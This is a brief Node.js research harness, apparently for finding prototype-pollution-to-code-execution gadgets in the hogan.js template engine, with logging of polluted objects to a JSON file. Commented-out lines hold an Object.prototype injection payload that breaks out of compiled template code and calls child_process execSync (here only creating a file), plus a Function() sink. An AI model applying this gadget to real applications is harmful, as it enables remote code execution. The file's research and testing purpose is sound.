const fs = require('fs');
global.__ppaeg_util = require('util')
global.__ppaeg_options = {showHidden:true, depth:3,compact:true, maxArrayLength:2, maxStringLengthL:30}
global.__ppaeg_logger = []
const hogan = require("hogan.js");


/* Payload Injection*/
// inject property to root prototype
// Object.prototype.asString = '1';
// Object.prototype.name = '2';
// Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`touch ./attack.txt`).toString()}}//"

/* Test Application Part*/
const TEMPLATE = `
<p1>Template</p1>
`;
const template = hogan.compile(TEMPLATE);

// pp2rce sink
// Function(`return ${template}`)();

fs.writeFile('../logged_objs.json', JSON.stringify(__ppaeg_logger, null, '	'), 'utf8', ()=>{});